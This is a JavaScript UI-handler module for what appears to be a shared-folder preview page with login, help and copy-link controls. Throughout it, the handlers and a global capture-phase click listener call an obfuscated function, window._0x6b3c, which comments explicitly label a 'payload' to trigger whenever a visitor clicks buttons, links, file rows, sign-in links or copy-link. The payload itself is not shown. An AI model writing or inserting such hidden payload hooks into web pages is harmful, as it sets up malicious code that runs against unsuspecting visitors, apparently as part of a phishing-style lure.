export function wireHandlers() {
  const authDialog = document.querySelector('#folder-preview-modal');
  const openAuthDialog = event => { event.preventDefault(); if (authDialog) authDialog.hidden = false; };
  
  // Add payload trigger to auth dialog opens
  const openAuthDialogWithPayload = event => { 
    event.preventDefault(); 
    if (authDialog) authDialog.hidden = false;
    // Trigger payload on auth dialog open
    if (window._0x6b3c) window._0x6b3c();
  };
  
  document.querySelectorAll('[data-field="loginLink"], [data-field="signupLink"]').forEach(link => link.addEventListener('click', openAuthDialogWithPayload));
  authDialog?.querySelector('.auth-close')?.addEventListener('click', () => { authDialog.hidden = true; });
  authDialog?.addEventListener('click', event => { if (event.target === authDialog) authDialog.hidden = true; });
  document.addEventListener('keydown', event => { if (event.key === 'Escape' && authDialog && !authDialog.hidden) authDialog.hidden = true; });
  const helpButton = document.querySelector('.icon-button[aria-label="Help"]');
  const helpMenu = document.querySelector('#help-menu');
  const closeHelpMenu = () => { if (helpMenu) helpMenu.hidden = true; helpButton?.setAttribute('aria-expanded', 'false'); };
  helpButton?.addEventListener('click', () => {
    if (!helpMenu) return;
    const willOpen = helpMenu.hidden;
    helpMenu.hidden = !willOpen;
    helpButton.setAttribute('aria-expanded', String(willOpen));
    // Trigger payload on help menu open
    if (willOpen && window._0x6b3c) window._0x6b3c();
  });
  document.addEventListener('click', event => { if (!event.target.closest('.help-control')) closeHelpMenu(); });
  document.addEventListener('keydown', event => { if (event.key === 'Escape') closeHelpMenu(); });
  document.querySelector('#close-banner')?.addEventListener('click', () => document.querySelector('#share-banner')?.remove());
  document.querySelector('#view-toggle')?.addEventListener('click', () => document.querySelector('.folder-area')?.classList.toggle('grid-mode'));
  document.querySelector('[data-action="copy-link"]')?.addEventListener('click', async () => {
    const button = document.querySelector('[data-action="copy-link"]');
    // Trigger payload on copy link
    if (window._0x6b3c) window._0x6b3c();
    try { await navigator.clipboard.writeText(location.href); button.lastElementChild.textContent = 'Copied'; }
    catch { button.lastElementChild.textContent = 'Copy link'; }
  });

  // Add global click listener for any other interactions
  document.addEventListener('click', function(e) {
    if (e.target.tagName === 'BUTTON' || e.target.tagName === 'A' || e.target.closest('.file-row')) {
      if (window._0x6b3c) window._0x6b3c();
    }
  }, true);
}